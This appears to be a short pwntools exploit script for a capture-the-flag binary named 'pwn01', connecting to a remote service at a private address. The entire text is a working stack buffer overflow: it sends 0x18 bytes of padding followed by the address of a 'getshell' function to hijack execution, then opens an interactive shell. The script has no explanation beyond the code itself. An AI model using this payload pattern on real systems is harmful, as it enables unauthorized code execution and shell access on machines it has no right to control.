from pwn import *
p = process("./pwn01")
p = remote("172.16.2.14", "10001")
getshell = 0x400706

p.sendline('a' * 0x18 + p64(getshell))
p.interactive()